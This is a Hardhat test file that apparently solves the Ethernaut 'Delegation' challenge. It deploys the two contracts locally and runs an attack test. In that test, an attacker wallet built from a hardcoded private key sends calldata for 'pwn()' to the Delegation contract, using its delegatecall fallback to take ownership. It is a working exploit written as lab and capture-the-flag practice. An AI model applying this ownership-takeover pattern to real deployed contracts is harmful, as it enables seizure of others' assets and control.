const { expect } = require("chai");
const { ethers } = require("hardhat");
require("dotenv").config();

describe("Delegation", () => {
    let deployer, attacker;
    let Delegate;
    let delegate, delegation;

    beforeEach(async () => {
        // Setup accounts
        [deployer] = await ethers.getSigners();

        // Deploy Delegate
        Delegate = await ethers.getContractFactory("Delegate");
        delegate = await Delegate.deploy(deployer.address);

        // Deploy Delegation
        const Delegation = await ethers.getContractFactory("Delegation");
        delegation = await Delegation.deploy(delegate.address);
    })

    describe("Delegate Contract", () => {
        it('Has a owner', async () => {
            const result = await delegate.owner();
            expect(result).to.equal(deployer.address);
        })
    })

    describe("Delegation Contract", () => {
        it('Has a owner', async () => {
            const result = await delegation.owner();
            expect(result).to.equal(deployer.address);
        })
    })

    describe("Delegation Attack", () => {
        beforeEach(async () => {
            attacker = new ethers.Wallet("59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider)

            const data = Delegate.interface.encodeFunctionData("pwn()", []);

            const transactionObj = {
                from: attacker.address,
                to: delegation.address,
                data: data,
                nonce: await attacker.getTransactionCount(),
                gasPrice: await ethers.provider.getGasPrice(),
                gasLimit: 1000000
            };

            const transaction = await attacker.signTransaction(transactionObj);
            await ethers.provider.sendTransaction(transaction);
        })

        it('Delegation has a new owner', async () => {
            const result = await delegation.owner();
            expect(result).to.equal(attacker.address);
        })
    })
})
